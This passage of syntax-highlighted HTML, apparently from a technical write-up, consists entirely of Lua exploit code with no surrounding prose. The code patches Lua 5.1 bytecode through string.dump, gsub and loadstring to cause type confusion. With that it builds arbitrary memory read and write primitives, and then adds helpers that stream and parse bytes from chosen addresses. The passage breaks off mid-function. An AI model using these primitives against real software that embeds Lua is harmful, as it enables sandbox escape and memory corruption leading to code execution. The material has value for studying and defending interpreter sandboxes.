</span><span class='line'>  <span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">x</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">&lt;d&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">asdouble</span> <span class="o">=</span> <span class="nb">loadstring</span><span class="p">((</span><span class="nb">string.dump</span><span class="p">(</span><span class="n">function</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="mi">0</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">i</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span><span class="p">):</span><span class="n">gsub</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\96</span><span class="s">%z%z</span><span class="se">\128</span><span class="s">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\22\0\0\128</span><span class="s">&#39;</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">asstring</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">return</span> <span class="n">double2string</span><span class="p">(</span><span class="n">asdouble</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">cstring</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addbyte</span><span class="p">(</span><span class="n">asstring</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="mi">24</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">string2double</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">r</span><span class="p">,</span><span class="n">n</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">&lt;d&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">r</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">subb8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8l</span><span class="p">,</span> <span class="n">b8r</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">borrow</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">cb</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8l</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="n">borrow</span> <span class="o">-</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8r</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">cb</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">borrow</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="n">cb</span> <span class="o">=</span> <span class="n">cb</span> <span class="o">+</span> <span class="mi">256</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">borrow</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">cb</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">tob8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">256</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">next_byte</span><span class="p">)</span>
</span><span class='line'>    <span class="n">n</span> <span class="o">=</span> <span class="nb">math.floor</span><span class="p">(</span><span class="n">n</span> <span class="o">/</span> <span class="mi">256</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">toint</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span> <span class="k">do</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">*</span> <span class="mi">256</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">addb8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8l</span><span class="p">,</span> <span class="n">b8r</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">&#39;</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">cb</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8l</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">carry</span> <span class="o">+</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8r</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">cb</span> <span class="o">&gt;=</span> <span class="mi">256</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">cb</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">addint</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">int</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addb8</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">tob8</span><span class="p">(</span><span class="n">int</span><span class="p">))</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">subint</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">int</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">subb8</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">tob8</span><span class="p">(</span><span class="n">int</span><span class="p">))</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">dump8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">b8</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="k">return</span> <span class="s2">&quot;</span><span class="s">&lt;nil&gt;&quot;</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">string.format</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">%02x%02x%02x%02x%02x%02x%02x%02x&#39;</span><span class="p">,</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">6</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">dump4</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b4</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">string.format</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">%02x%02x%02x%02x&#39;</span><span class="p">,</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b4</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b4</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b4</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">b4</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">word_read</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">return_read_word</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="n">word_read</span> <span class="o">=</span> <span class="n">b8</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">read_word</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">loadstring</span><span class="p">(</span><span class="nb">string.dump</span><span class="p">(</span><span class="n">function</span><span class="p">()</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">magic</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>    <span class="kd">local</span> <span class="k">function</span> <span class="nf">middle</span><span class="p">()</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">upval</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">cstring</span> <span class="o">=</span> <span class="n">cstring_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">asstring</span> <span class="o">=</span> <span class="n">asstring_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">b8</span> <span class="o">=</span> <span class="n">word_to_read_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">return_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="k">function</span> <span class="nf">inner</span><span class="p">()</span>
</span><span class='line'>        <span class="n">upval</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">nextnext&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">t&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">m&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">papapa&#39;</span><span class="o">..</span><span class="n">b8</span>
</span><span class='line'>        <span class="kd">local</span> <span class="n">upval_ptr</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">(</span><span class="n">upval</span><span class="p">)</span>
</span><span class='line'>        <span class="n">magic</span> <span class="o">=</span> <span class="n">upval_ptr</span> <span class="o">..</span> <span class="n">upval_ptr</span> <span class="o">..</span> <span class="n">upval_ptr</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>      <span class="n">inner</span><span class="p">()</span>
</span><span class='line'>      <span class="n">ret</span><span class="p">(</span><span class="n">asstring</span><span class="p">(</span><span class="n">magic</span><span class="p">))</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">middle</span><span class="p">()</span>
</span><span class='line'>  <span class="k">end</span><span class="p">):</span><span class="n">gsub</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">(</span><span class="se">\100</span><span class="s">%z%z%z)....&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">%1</span><span class="se">\0\0\0\1</span><span class="s">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">return_function</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">v</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="n">cstring_global</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">,</span> <span class="n">asstring_global</span> <span class="o">=</span> <span class="n">asstring</span><span class="p">,</span> <span class="n">word_to_read_global</span> <span class="o">=</span> <span class="n">address</span><span class="p">,</span> <span class="n">return_read_word_global</span> <span class="o">=</span> <span class="n">return_read_word</span><span class="p">,</span> <span class="n">return_global</span> <span class="o">=</span> <span class="n">return_function</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">setfenv</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
</span><span class='line'>  <span class="n">f</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="cm">--[[ write word also corrupts the next 4 bytes after address :( const TValue *o2=(obj2); TValue *o1=(obj1); \</span>
</span><span class='line'><span class="cm">    o1-&gt;value = o2-&gt;value; o1-&gt;tt=o2-&gt;tt; ]]</span>
</span><span class='line'><span class="kd">local</span> <span class="n">write_word</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">loadstring</span><span class="p">(</span><span class="nb">string.dump</span><span class="p">(</span><span class="n">function</span><span class="p">()</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">magic</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>    <span class="kd">local</span> <span class="k">function</span> <span class="nf">middle</span><span class="p">()</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">upval</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">cstring</span> <span class="o">=</span> <span class="n">cstring_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">string2double</span> <span class="o">=</span> <span class="n">string2double_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">b8</span> <span class="o">=</span> <span class="n">address_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">value</span> <span class="o">=</span> <span class="n">value_to_write_global</span>
</span><span class='line'>      <span class="kd">local</span> <span class="k">function</span> <span class="nf">inner</span><span class="p">()</span>
</span><span class='line'>        <span class="n">upval</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">nextnext&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">t&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">m&#39;</span><span class="o">..</span><span class="s1">&#39;</span><span class="s">papapa&#39;</span><span class="o">..</span><span class="n">b8</span>
</span><span class='line'>        <span class="kd">local</span> <span class="n">upval_ptr</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">(</span><span class="n">upval</span><span class="p">)</span>
</span><span class='line'>        <span class="n">magic</span> <span class="o">=</span> <span class="n">upval_ptr</span> <span class="o">..</span> <span class="n">upval_ptr</span> <span class="o">..</span> <span class="n">upval_ptr</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>      <span class="n">inner</span><span class="p">()</span>
</span><span class='line'>      <span class="n">magic</span> <span class="o">=</span> <span class="n">string2double</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">middle</span><span class="p">()</span>
</span><span class='line'>  <span class="k">end</span><span class="p">):</span><span class="n">gsub</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">(</span><span class="se">\100</span><span class="s">%z%z%z)....&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="s">%1</span><span class="se">\0\0\0\1</span><span class="s">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="n">cstring_global</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">,</span> <span class="n">string2double_global</span> <span class="o">=</span> <span class="n">string2double</span><span class="p">,</span> <span class="n">address_global</span> <span class="o">=</span> <span class="n">address</span><span class="p">,</span> <span class="n">value_to_write_global</span> <span class="o">=</span> <span class="n">value</span><span class="p">}</span>
</span><span class='line'>  <span class="nb">setfenv</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>
</span><span class='line'>  <span class="n">f</span><span class="p">()</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">new_lazy_stream</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">{</span><span class="n">buffer</span> <span class="o">=</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">buffer_offset</span> <span class="o">=</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">start_offset</span> <span class="o">=</span> <span class="n">offset</span><span class="p">,</span> <span class="n">current_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">lazy_stream_seek</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">=</span> <span class="n">offset</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">lazy_stream_skip</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">+</span> <span class="n">offset</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">lazy_stream_read</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer</span> <span class="o">==</span> <span class="kc">nil</span> <span class="ow">or</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">&lt;</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer_offset</span> <span class="ow">or</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">&gt;=</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer_offset</span> <span class="o">+</span> <span class="mi">8</span> <span class="k">then</span>
</span><span class='line'>    <span class="cm">--[[ dodgy floats ie repeated bytes of 0xFF will trigger multiple reads because the first word will fail then the next and so forth :( )]]</span>
</span><span class='line'>    <span class="n">stream</span><span class="p">.</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">start_offset</span><span class="p">,</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span><span class="p">))</span>
</span><span class='line'>    <span class="n">stream</span><span class="p">.</span><span class="n">buffer_offset</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">byte</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">byte</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">buffer</span><span class="p">,</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">-</span> <span class="n">stream</span><span class="p">.</span><span class="n">buffer_offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">byte</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">lazy_stream_empty</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">&gt;=</span> <span class="n">stream</span><span class="p">.</span><span class="n">size</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">read_uleb8</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">shift</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">while</span> <span class="kc">true</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">masked</span> <span class="o">=</span> <span class="n">next_byte</span> <span class="o">%</span> <span class="mh">0x80</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="n">value</span> <span class="o">=</span> <span class="n">value</span> <span class="o">+</span> <span class="p">(</span><span class="n">masked</span> <span class="o">*</span> <span class="n">shift</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">high_bit</span> <span class="o">=</span> <span class="n">next_byte</span> <span class="o">-</span> <span class="n">masked</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">high_bit</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">value</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">shift</span> <span class="o">=</span> <span class="n">shift</span> <span class="o">*</span> <span class="nb">math.pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">read_string</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">value</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="k">while</span> <span class="kc">true</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">next_byte</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="nb">table.concat</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">next_byte</span><span class="p">))</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">ALTERNATION</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'><span class="kd">local</span> <span class="n">FINAL</span> <span class="o">=</span> <span class="mi">257</span>
</span><span class='line'><span class="kd">local</span> <span class="n">ANY</span> <span class="o">=</span> <span class="mi">258</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">alternation</span><span class="p">(</span><span class="n">list</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">list</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">assertion failed&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">list</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">then</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">list</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">current</span> <span class="o">=</span> <span class="p">{</span><span class="n">first_branch</span> <span class="o">=</span> <span class="n">list</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">second_branch</span> <span class="o">=</span> <span class="n">list</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">ALTERNATION</span><span class="p">}</span>
